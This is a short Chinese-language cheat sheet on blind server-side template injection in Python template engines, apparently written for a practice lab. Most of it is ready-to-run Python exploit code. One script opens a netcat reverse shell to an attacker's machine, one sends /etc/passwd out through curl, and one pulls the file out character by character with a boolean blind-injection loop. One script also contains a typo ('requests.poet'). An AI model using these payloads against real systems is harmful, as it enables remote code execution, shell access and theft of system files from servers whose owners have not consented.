## SSTI盲注思路

无回显例题：
- true（`{{''.__class__}}`）：corret
- false（`{{}}`）：wrong

---

### 反弹shell

通过rce反弹一个shell出来绕过过无回显的页面

kali：`nc -lvp 7777`

py脚本：
```python

import requests

url = "靶场ip"

for i in range(300):
	try:
		data = {"code": '{{"".__class__.__base__.__subclasses__()['+str(i)+'].__init__.__globals__["popen"]("netcat 192.168.1.161 7777 -e /bin/bash").read()}}'}
		response = requests.poet(url, data=data)
	except:
		pass

```



### 带外注入

使用curl、dnslog等方法来外带目标数据

kali：`python3 -m http.server 80`

py脚本：
```python

import requests

url = "靶场ip"

for i in range(300):
	try:
		data = {"code": '{{"".__class__.__base__.__subclasses__()['+str(i)+'].__init__.__globals__["popen"]("curl http://192.168.1.161/`cat /etc/passwd`").read()}}'}
		response = requests.post(url, data=data)
		
	except:
		pass

```

### 纯盲注

```python

import requests

url = "靶场ip"

def check(payload):
	postdata = {
		'code': payload
	}
	response = requests.post(url, data=postdata)
	if 'benben' in response.text:
		return '1'

passwd = ''
s = r'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"$\'()*+,-./:;<=>?@[\\]^`{|}~\'"_%'

for i in range(0, 100):
	for c in s:
		payload = '{%if "".__class__.__bases__[0].__subclasses__()[199].__init__.__globals__["os"].popen("cat /etc/passwd").read()['+str(i)+':'+str(i+1)+']=="'+c+'"%}benben{%endif%}'
		if check(payload):
			passwd += c
			break
	print(passwd)

```
